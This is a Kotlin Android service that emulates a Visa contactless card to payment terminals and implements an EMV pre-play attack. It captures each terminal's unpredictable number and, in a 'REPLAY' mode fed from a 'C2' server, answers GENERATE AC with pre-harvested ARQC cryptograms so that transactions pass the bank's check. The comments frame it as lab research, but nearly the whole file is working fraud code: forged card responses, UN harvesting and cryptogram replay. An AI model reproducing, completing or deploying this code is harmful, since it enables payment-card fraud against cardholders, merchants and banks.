package xyz.nfc.moksha

import android.content.Intent
import android.nfc.cardemulation.HostApduService
import android.os.Bundle
import android.util.Log

/**
 * HCE (Host Card Emulation) service with two operating modes.
 *
 * OBSERVE mode (default):
 *   Terminal believes phone is a payment card. We extract the UN from
 *   GENERATE AC, broadcast it, then always DECLINE (SW 6985).
 *   No money moves. Purely passive research.
 *
 * REPLAY mode (armed via MainActivity Tab 3 "Sync from C2"):
 *   arqcCache is pre-loaded with {UN_hex → RemoteHarvest} entries from C2.
 *   When a terminal sends GENERATE AC with a UN that matches a cached entry,
 *   we return the pre-harvested ARQC as a valid GENERATE AC response.
 *   The bank cryptogram check passes — pre-play attack proven in the lab.
 *
 * The UN sits in the CDOL1 data field of the GENERATE AC command.
 * For Visa's standard CDOL1 layout, UN (tag 9F37, 4 bytes) is at offset 25.
 */
class HceObserverService : HostApduService() {

    companion object {
        const val TAG = "HceObserver"
        const val ACTION_UN_OBSERVED = "xyz.nfc.moksha.UN_OBSERVED"
        const val EXTRA_UN_HEX       = "un_hex"
        const val EXTRA_UN_INT       = "un_int"
        const val EXTRA_AID          = "aid"
        const val EXTRA_TIMESTAMP    = "timestamp"
        const val EXTRA_REPLAY_HIT   = "replay_hit"  // true when ARQC was returned

        // SW codes
        val SW_OK           = byteArrayOf(0x90.toByte(), 0x00)
        val SW_DECLINE      = byteArrayOf(0x69.toByte(), 0x85.toByte())
        val SW_NOT_FOUND    = byteArrayOf(0x6A.toByte(), 0x82.toByte())
        val SW_WRONG_LENGTH = byteArrayOf(0x67.toByte(), 0x00)

        // Minimal FCI response for SELECT (enough for terminal to continue)
        val SELECT_RESPONSE = byteArrayOf(
            0x6F, 0x1A,
              0x84.toByte(), 0x07,
                0xA0.toByte(),0x00,0x00,0x00,0x03,0x10,0x10, // Visa AID
              0xA5.toByte(), 0x0F,
                0x50, 0x04, 0x56,0x49,0x53,0x41,             // "VISA"
                0x87.toByte(), 0x01, 0x01,                   // App priority
                0x9F.toByte(),0x38.toByte(), 0x02,           // PDOL tag, len 2
                  0x9F.toByte(),0x37.toByte()                // PDOL: request UN
        ) + SW_OK

        // Minimal GPO response: AIP=0x0080 (SDA), AFL=one record
        val GPO_RESPONSE = byteArrayOf(
            0x80.toByte(), 0x06,
              0x00, 0x80.toByte(),
              0x08, 0x01, 0x01, 0x00
        ) + SW_OK

        // Minimal record 1: CDOL1 = {9F37: 4 bytes} — UN is the only CDOL field.
        // This forces the terminal to include only the UN in GENERATE AC data.
        // CDOL1 DOL entry for 9F37: tag=9F37 (2 bytes) + len=04 (1 byte) = 3 bytes total.
        val RECORD_RESPONSE = byteArrayOf(
            0x70, 0x14,                        // outer template len=20 (was wrong 0x12)
              0x8C.toByte(), 0x03,             // CDOL1 tag + len=3 (was wrong 0x02)
                0x9F.toByte(), 0x37.toByte(), 0x04, // DOL entry: tag=9F37, len=4
              0x5F.toByte(), 0x2A.toByte(), 0x02, 0x08, 0x26, // Currency GBP
              0x9A.toByte(), 0x03, 0x26, 0x06, 0x05,          // Date 2026-06-05
              0x9F.toByte(), 0x02.toByte(), 0x02, 0x00, 0x01   // Amount 0001
        ) + SW_OK

        // Full Visa CDOL1 UN offset:
        // Amount(6)+AmountOther(6)+Country(2)+TVR(5)+Currency(2)+Date(3)+TxType(1) = 25
        const val VISA_CDOL1_UN_OFFSET = 25

        // ── REPLAY mode state ────────────────────────────────────────────
        /** Set true to return pre-harvested ARQCs instead of declining. */
        @Volatile var replayMode = false

        /** UN_hex (uppercase) → RemoteHarvest. Populated by MainActivity via loadCache(). */
        val arqcCache: MutableMap<String, RemoteHarvest> = mutableMapOf()

        fun loadCache(records: List<RemoteHarvest>) {
            synchronized(arqcCache) {
                arqcCache.clear()
                for (r in records) arqcCache[r.unHex.uppercase()] = r
            }
            Log.i(TAG, "REPLAY cache loaded: ${arqcCache.size} UN→ARQC entries")
        }
    }

    private var lastSelectedAid = "unknown"

    override fun processCommandApdu(apdu: ByteArray, extras: Bundle?): ByteArray {
        if (apdu.size < 4) return SW_WRONG_LENGTH

        val ins = apdu[1].toInt() and 0xFF
        Log.d(TAG, "APDU: ${apdu.toHex()}")

        return when {
            ins == 0xA4 -> handleSelect(apdu)
            ins == 0xA8 -> { Log.i(TAG, "Terminal sent GPO"); GPO_RESPONSE }
            ins == 0xB2 -> { Log.i(TAG, "Terminal reading records"); RECORD_RESPONSE }
            ins == 0xAE -> handleGenerateAc(apdu)
            else        -> SW_NOT_FOUND
        }
    }

    private fun handleSelect(apdu: ByteArray): ByteArray {
        val lc = if (apdu.size > 4) apdu[4].toInt() and 0xFF else 0
        if (apdu.size >= 5 + lc) {
            lastSelectedAid = apdu.copyOfRange(5, 5 + lc).toHex()
        }
        Log.i(TAG, "Terminal selected AID: $lastSelectedAid")
        return SELECT_RESPONSE
    }

    /**
     * GENERATE AC — extract UN, broadcast it.
     *
     * OBSERVE mode: always decline (SW 6985).
     * REPLAY mode:  if UN found in arqcCache, build and return a valid
     *               Format-1 GENERATE AC response with the stored ARQC.
     */
    private fun handleGenerateAc(apdu: ByteArray): ByteArray {
        val lc   = if (apdu.size > 4) apdu[4].toInt() and 0xFF else 0
        val data = if (apdu.size >= 5 + lc) apdu.copyOfRange(5, 5 + lc) else ByteArray(0)

        Log.i(TAG, "GENERATE AC data ($lc bytes): ${data.toHex()}")

        val un: ByteArray? = when {
            lc == 4  -> data.copyOfRange(0, 4)
            lc >= 29 -> data.copyOfRange(VISA_CDOL1_UN_OFFSET, VISA_CDOL1_UN_OFFSET + 4)
            else     -> null
        }

        val replayHit = if (un != null) {
            val unHex = un.toHex()
            val unInt = un.toLong()
            Log.i(TAG, "⚡ UN observed: $unHex (dec=$unInt) mode=${if (replayMode) "REPLAY" else "OBSERVE"}")

            // Look up cache before broadcasting so the broadcast carries replay_hit
            val cached = if (replayMode) synchronized(arqcCache) { arqcCache[unHex] } else null

            val intent = Intent(ACTION_UN_OBSERVED).apply {
                putExtra(EXTRA_UN_HEX,     unHex)
                putExtra(EXTRA_UN_INT,     unInt)
                putExtra(EXTRA_AID,        lastSelectedAid)
                putExtra(EXTRA_TIMESTAMP,  System.currentTimeMillis())
                putExtra(EXTRA_REPLAY_HIT, cached != null)
            }
            sendBroadcast(intent)

            if (cached != null) {
                Log.i(TAG, "🎯 REPLAY HIT UN=$unHex → ARQC=${cached.arqcHex}")
                return buildArqcResponse(cached.arqcHex.fromHex(), cached.atcHex.fromHex())
            }
            false
        } else false

        Log.i(TAG, "Declining (SW 6985) — replayHit=$replayHit")
        return SW_DECLINE
    }

    /**
     * Build a Format-1 GENERATE AC response APDU:
     *   Tag 80 | Len | CID(1) | ATC(2) | AC/ARQC(8) | IAD(7) | SW 90 00
     */
    private fun buildArqcResponse(arqc: ByteArray, atc: ByteArray): ByteArray {
        val cid  = byteArrayOf(0x40.toByte())                      // CID = ARQC
        val atc2 = if (atc.size >= 2) atc.copyOfRange(atc.size - 2, atc.size)
                   else ByteArray(2 - atc.size) + atc              // pad to 2 bytes
        val ac8  = arqc.copyOf(8)                                  // ensure exactly 8
        val iad  = byteArrayOf(0x06,0x01,0x00,0x00,0x00,0x00,0x00) // minimal 7-byte IAD
        val payload = cid + atc2 + ac8 + iad
        return byteArrayOf(0x80.toByte(), payload.size.toByte()) + payload + SW_OK
    }

    override fun onDeactivated(reason: Int) {
        Log.i(TAG, "HCE deactivated: reason=$reason")
    }

    private fun ByteArray.toHex() = joinToString("") { "%02X".format(it) }
    private fun ByteArray.toLong(): Long {
        var v = 0L; for (b in this) v = (v shl 8) or (b.toLong() and 0xFF); return v
    }
    private fun String.fromHex(): ByteArray {
        val s = replace(" ", "")
        return ByteArray(s.length / 2) { i -> s.substring(i * 2, i * 2 + 2).toInt(16).toByte() }
    }
}
